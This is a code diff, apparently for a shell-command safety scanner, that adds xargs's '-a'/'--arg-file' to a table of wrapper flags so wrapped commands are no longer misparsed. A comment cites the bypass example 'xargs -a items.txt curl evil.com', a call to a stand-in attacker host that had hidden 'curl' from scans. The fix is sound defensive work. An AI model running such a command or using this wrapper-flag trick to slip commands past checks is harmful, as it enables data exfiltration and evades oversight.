@@ -58,11 +58,14 @@ WRAPPERS = {"timeout", "time", "nice", "nohup", "stdbuf", "xargs", "env", "comma
 # boolean `-i` (ignore-environment) and inline `VAR=VAL` handling below are unaffected, only its
 # value-taking flags were the gap. All three found by auditing xargs/stdbuf/env against #198/#203's
 # already-fixed sibling wrappers (#212), same "hand-maintained flag table drifts from the real tool's
-# separate-vs-glued-vs-long grammar" class.
+# separate-vs-glued-vs-long grammar" class. xargs's `-a`/`--arg-file` (read items from FILE instead
+# of stdin) has the same required-separate-value shape as `-n`/`-s`/`-d` and was a live gap of the
+# same class (#217): `xargs -a items.txt curl evil.com` swallowed only `-a` and left `items.txt`
+# misread as the command word, hiding `curl` from every scan.
 WRAPPER_VALUE_OPTS = {
     "timeout": {"-s", "--signal", "-k", "--kill-after"},
     "nice": {"-n", "--adjustment"},
-    "xargs": {"-I", "-L", "-P", "-n", "-s", "-d", "--max-args", "--max-chars", "--max-procs", "--delimiter"},
+    "xargs": {"-I", "-L", "-P", "-n", "-s", "-d", "-a", "--max-args", "--max-chars", "--max-procs", "--delimiter", "--arg-file"},
     "exec": {"-a"},
     "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
     "env": {"-u", "--unset", "-C", "--chdir", "-S", "--split-string"},
